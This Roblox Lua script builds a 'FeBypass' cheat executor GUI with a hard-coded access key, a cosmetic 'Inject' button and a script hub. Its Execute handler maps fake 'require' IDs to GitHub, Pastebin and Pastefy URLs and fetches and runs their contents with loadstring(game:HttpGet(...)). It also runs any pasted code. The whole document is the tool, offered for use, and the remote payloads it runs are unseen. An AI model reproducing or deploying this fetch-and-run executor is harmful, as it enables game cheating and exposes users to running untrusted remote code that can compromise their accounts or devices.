-- GUI Setup
local player = game.Players.LocalPlayer
local UIS = game:GetService("UserInputService")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "FeBypass"
ScreenGui.Parent = player:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 330)
Frame.Position = UDim2.new(0.5, -200, 0.5, -165)
Frame.BackgroundColor3 = Color3.fromRGB(173, 216, 230) -- Light blue
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true

-- Close Button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = Frame
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -35, 0, 5)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.new(1, 1, 1)
CloseBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
CloseBtn.Font = Enum.Font.SourceSansBold
CloseBtn.TextScaled = true
CloseBtn.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
end)

-- TextBox
local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0.7, -10)
TextBox.Position = UDim2.new(0, 10, 0, 10)
TextBox.ClearTextOnFocus = false
TextBox.Text = ""
TextBox.TextWrapped = true
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TextBox.TextScaled = false
TextBox.Font = Enum.Font.Code
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

-- Key Input
local KeyInput = Instance.new("TextBox")
KeyInput.Parent = Frame
KeyInput.Size = UDim2.new(0.6, -10, 0.1, 0)
KeyInput.Position = UDim2.new(0.05, 0, 0.87, 0)
KeyInput.PlaceholderText = "Enter access key..."
KeyInput.Text = ""
KeyInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
KeyInput.TextColor3 = Color3.new(1, 1, 1)
KeyInput.Font = Enum.Font.Code
KeyInput.TextScaled = true

-- Verify Key Button
local VerifyKeyBtn = Instance.new("TextButton")
VerifyKeyBtn.Parent = Frame
VerifyKeyBtn.Size = UDim2.new(0.3, -10, 0.1, 0)
VerifyKeyBtn.Position = UDim2.new(0.65, 0, 0.87, 0)
VerifyKeyBtn.Text = "Verify Key"
VerifyKeyBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
VerifyKeyBtn.TextColor3 = Color3.new(1, 1, 1)
VerifyKeyBtn.Font = Enum.Font.SourceSans
VerifyKeyBtn.TextScaled = true

-- Inject Button
local InjectBtn = Instance.new("TextButton")
InjectBtn.Parent = Frame
InjectBtn.Size = UDim2.new(0.3, -10, 0.1, -10)
InjectBtn.Position = UDim2.new(0.05, 0, 0.75, 0)
InjectBtn.Text = "Inject"
InjectBtn.BackgroundColor3 = Color3.fromRGB(180, 30, 30)
InjectBtn.TextColor3 = Color3.new(1, 1, 1)
InjectBtn.Font = Enum.Font.SourceSans
InjectBtn.TextScaled = true
InjectBtn.Active = false
InjectBtn.AutoButtonColor = false

-- Execute Button
local ExecuteBtn = Instance.new("TextButton")
ExecuteBtn.Parent = Frame
ExecuteBtn.Size = UDim2.new(0.3, -10, 0.1, -10)
ExecuteBtn.Position = UDim2.new(0.35, 0, 0.75, 0)
ExecuteBtn.Text = "Execute"
ExecuteBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
ExecuteBtn.TextColor3 = Color3.new(1, 1, 1)
ExecuteBtn.Font = Enum.Font.SourceSans
ExecuteBtn.TextScaled = true
ExecuteBtn.Active = false
ExecuteBtn.AutoButtonColor = false

-- Clear Button
local ClearBtn = Instance.new("TextButton")
ClearBtn.Parent = Frame
ClearBtn.Size = UDim2.new(0.3, -10, 0.1, -10)
ClearBtn.Position = UDim2.new(0.65, 0, 0.75, 0)
ClearBtn.Text = "Clear"
ClearBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
ClearBtn.TextColor3 = Color3.new(1, 1, 1)
ClearBtn.Font = Enum.Font.SourceSans
ClearBtn.TextScaled = true

-- Script Hub ScrollingFrame
local HubFrame = Instance.new("ScrollingFrame")
HubFrame.Parent = ScreenGui
HubFrame.Size = UDim2.new(0, 150, 0, 330)
HubFrame.Position = UDim2.new(0.5, -360, 0.5, -165)
HubFrame.BackgroundColor3 = Color3.fromRGB(173, 216, 230)
HubFrame.BorderSizePixel = 0
HubFrame.ScrollBarThickness = 6
HubFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
HubFrame.ClipsDescendants = true

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = HubFrame
UIListLayout.Padding = UDim.new(0, 5)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

local UIPadding = Instance.new("UIPadding")
UIPadding.Parent = HubFrame
UIPadding.PaddingTop = UDim.new(0, 5)
UIPadding.PaddingBottom = UDim.new(0, 5)
UIPadding.PaddingLeft = UDim.new(0, 5)
UIPadding.PaddingRight = UDim.new(0, 5)

-- Search Bar
local SearchBox = Instance.new("TextBox")
SearchBox.Parent = HubFrame
SearchBox.Size = UDim2.new(1, -10, 0, 30)
SearchBox.BackgroundColor3 = Color3.fromRGB(240, 248, 255)
SearchBox.TextColor3 = Color3.new(0, 0, 0)
SearchBox.PlaceholderText = "Search scripts..."
SearchBox.Text = ""
SearchBox.Font = Enum.Font.SourceSans
SearchBox.TextScaled = true
SearchBox.ClearTextOnFocus = true
SearchBox.LayoutOrder = -1

-- List of Scripts
local scriptList = {
    {Name = "Super Script", Code = "require(3100090)"},
    {Name = "Polaria", Code = "require(1000009)"},
    {Name = "Pastefy", Code = "require(10850)"},
    {Name = "Another Script", Code = "require(318880)"},
    {Name = "Error Script", Code = "require(15000)"},
    {Name = "HappyMod", Code = "require(9999100)"},
    {Name = "Updater", Code = "require(something)"}
}

local scriptButtons = {}

for _, scriptData in pairs(scriptList) do
    local btn = Instance.new("TextButton")
    btn.Parent = HubFrame
    btn.Size = UDim2.new(1, -10, 0, 30)
    btn.Text = scriptData.Name
    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.SourceSans
    btn.TextScaled = true
    btn.LayoutOrder = 1
    btn.MouseButton1Click:Connect(function()
        TextBox.Text = scriptData.Code
    end)

    table.insert(scriptButtons, {
        Button = btn,
        Name = scriptData.Name:lower()
    })
end

-- Filter Search
SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
    local term = SearchBox.Text:lower()
    for _, entry in ipairs(scriptButtons) do
        entry.Button.Visible = entry.Name:find(term) ~= nil
    end
end)

-- Logic
local correctKey = "Skidder"
local keyVerified = false
local injected = false

VerifyKeyBtn.MouseButton1Click:Connect(function()
    if KeyInput.Text == correctKey then
        keyVerified = true
        InjectBtn.Active = true
        ExecuteBtn.Active = true
        InjectBtn.AutoButtonColor = true
        ExecuteBtn.AutoButtonColor = true
        KeyInput.Visible = false
        VerifyKeyBtn.Visible = false
        print("Access granted. Key verified.")
    else
        VerifyKeyBtn.Text = "Wrong Key"
        task.wait(1)
        VerifyKeyBtn.Text = "Verify Key"
    end
end)

InjectBtn.MouseButton1Click:Connect(function()
    if not keyVerified then
        warn("Key not verified!")
        return
    end
    injected = true
    InjectBtn.Text = "Injected"
    print("Injected!")
end)

ExecuteBtn.MouseButton1Click:Connect(function()
    if not injected then
        warn("You must inject before executing!")
        return
    end

    local code = TextBox.Text:lower()

    local function tryLoad(url)
        local success, err = pcall(function()
            loadstring(game:HttpGet(url))()
        end)
        if not success then warn("Execution error:", err) end
    end

    -- Checking the script code and loading the appropriate URL
    if code:match("require%(3100090%)") then
        tryLoad("https://raw.githubusercontent.com/Yutreepode67/Public-fr/refs/heads/main/Super.txt")
    elseif code:match("require%(1000009%)") then
        tryLoad("https://raw.githubusercontent.com/hi822010/SuperPrivate/refs/heads/main/Polaria.lua")
    elseif code:match("require%(10850%)") then
        tryLoad("https://pastefy.app/doB7vrVL/raw")
    elseif code:match("require%(318880%)") then
        tryLoad("https://pastefy.app/qQ1FyEeF/raw")
    elseif code:match("require%(15000%)") then
        tryLoad("https://pastebin.com/raw/ERRk4rvM")
    elseif code:match("require%(9999100%)") then
        tryLoad("https://raw.githubusercontent.com/hi822010/HappyMod/refs/heads/main/source.lua")
    elseif code:match("require%(something%)") then
        tryLoad("https://raw.githubusercontent.com/Yutreepode67/Ks/refs/heads/main/some%20scripts(always%20update)")
    else
        local success, err = pcall(function()
            loadstring(TextBox.Text)()
        end)
        if not success then
            warn("Execution error:", err)
        end
    end
end)

ClearBtn.MouseButton1Click:Connect(function()
    TextBox.Text = ""
end)
